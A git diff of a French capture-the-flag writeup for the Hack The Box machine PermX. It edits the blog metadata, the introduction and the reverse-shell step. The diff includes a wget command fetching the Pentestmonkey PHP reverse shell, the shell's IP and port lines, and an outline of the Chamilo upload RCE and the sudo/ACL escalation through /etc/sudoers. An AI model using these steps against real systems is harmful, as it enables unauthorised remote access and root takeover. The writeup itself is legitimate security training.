@@ -16,8 +16,8 @@ draft: true
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "PermX (HTB Easy) : RCE sur Chamilo, extraction config, pivot SSH et escalade via ACL."
-description: "PermX (HTB Easy) : exploitation d’une RCE sur Chamilo LMS, extraction de configuration.php, pivot SSH et escalade de privilèges via ACL et sudo."
+summary: "PermX (HTB Easy) : de la RCE Chamilo au shell root, avec pivot SSH et escalade via ACL/sudo."
+description: "Writeup PermX (HTB Easy) : RCE sur Chamilo (upload), extraction de configuration.php, accès SSH, puis root via ACL et sudo."
 tags: ["Easy","Chamilo","RCE","Web","ACL","sudo"]
 categories: ["Mes writeups"]
 
@@ -29,7 +29,7 @@ TocOpen: true
 # --- Cover / images (Page Bundle) ---
 cover:
   image: "image.png"
-  alt: "Permx"
+  alt:  "PermX (HTB Easy) : exploitation Chamilo (RCE par upload) puis escalade root via ACL/sudo, expliqué pas à pas"
   caption: ""
   relative: true
   hidden: false
@@ -125,14 +125,9 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-PermX est une machine Hack The Box où une **vulnérabilité RCE sur Chamilo LMS** permet de passer d’un simple accès web à un **shell root complet sur Linux**.
- L’énumération révèle un portail Chamilo exposé, dont le mécanisme d’upload mal sécurisé ouvre la voie à l’exécution de commandes à distance.
-
-L’exploitation conduit à l’extraction du fichier `configuration.php`, contenant les **identifiants de la base de données**. Comme souvent en CTF, ce mot de passe est réutilisé et permet une **connexion SSH valide**, transformant un accès web initial en contrôle système.
-
-La phase finale repose sur une **escalade de privilèges locale** exploitant un script `sudo` vulnérable utilisant les ACL.
-
-Dans ce writeup, tu suis une démarche structurée : énumération, exploitation web, pivot vers SSH, puis élévation de privilèges jusqu’au flag root.
+PermX est une machine Hack The Box (Easy) où tu obtiens un premier accès grâce à une **RCE sur Chamilo LMS** via un **upload non restreint**.
+ Une fois un shell obtenu en `www-data`, tu récupères le fichier `configuration.php` pour extraire des identifiants, puis tu testes leur **réutilisation** afin de passer en **SSH**.
+ La dernière étape consiste à exploiter un **script autorisé via sudo** qui applique des **ACL** sur des fichiers, ce qui permet de viser un fichier sensible via un **lien symbolique** et d’atteindre **root**.
 
 ---
 
@@ -859,17 +854,28 @@ La réponse renvoyée par le serveur affiche le résultat de la commande `id`, c
 
 La RCE étant confirmée, l’étape suivante consiste à obtenir un accès interactif via un reverse shell. Comme **Chamilo** est une application écrite en **PHP**, il est logique d’utiliser un **payload PHP** pour rester dans le même contexte d’exécution.
 
-Pour cela, tu choisis le reverse shell **Pentestmonkey**, un payload PHP classique et éprouvé en CTF, disponible sur *revshells.com* ou directement sur le dépôt officiel GitHub. Il suffit de le récupérer, 
+Pour cela, tu choisis le reverse shell **Pentestmonkey**, un payload PHP classique et éprouvé en CTF, disponible  le dépôt officiel GitHub. 
+
+Récupère-le
 
 ```bash
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
 
-puis d’adapter le début du fichier avec ton adresse IP tun0 et le port d’écoute avant de l’utiliser.
+et adapte le début du fichier avec ton adresse IP tun0 et le port d’écoute avant de l’utiliser.
+
+Remplace :
 
 ```php
-ip = '127.0.0.1';  // CHANGE THIS
+$ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
+```
+
+par :
+
+```php
+$ip   = '10.10.14.xx';  // ton IP tun0
+$port = 4444;           // ton port d'écoute
 ```
 
 Une fois le payload PHP prêt et adapté avec ton adresse IP et le port d’écoute, tu peux l’uploader de la même manière que lors du Proof of Concept. L’endpoint vulnérable accepte toujours les fichiers envoyés via le champ `bigUploadFile`, ce qui permet d’envoyer le reverse shell PHP sans authentification.
@@ -1113,14 +1119,14 @@ Cette faiblesse est exploitée dans la suite pour obtenir une **élévation de p
 
 
 
-#### Choix du système système
+#### Choix du système
 
 L’étape suivante consiste à choisir le **fichier système le plus pertinent** à cibler, afin d’exploiter efficacement cette possibilité de modification des ACL et d’aboutir à une élévation de privilèges fiable.
 
 Plusieurs fichiers système peuvent théoriquement être ciblés via la modification des ACL, comme `/etc/passwd`, `/root/.ssh/authorized_keys` ou `/etc/sudoers`.
  Parmi ces options, **`/etc/sudoers`** est le choix le plus pertinent : il permet une élévation de privilèges **directe, contrôlée et réversible**, sans impacter la stabilité du système.
 
-**Nous allons donc exploiter cette possibilité en ciblant le fichier `/etc/sudoers` afin d’obtenir un accès root.**
+**Tu vas donc exploiter cette possibilité en ciblant le fichier `/etc/sudoers` afin d’obtenir un accès root.**
 
 #### Script d'exécution
 
@@ -1206,6 +1212,8 @@ La leçon est claire :
 - audite rigoureusement tout script exécutable via `sudo`.
 
 Une faiblesse isolée peut sembler mineure. Combinée aux autres, elle devient critique.
+
+Au final, c’est l’enchaînement **Chamilo (RCE par upload)** → **leak de configuration** → **réutilisation d’identifiants** → **sudo/ACL mal cadrés** qui mène au root.
 
 ## Post-exploitation : confirmation du nettoyage automatique
 
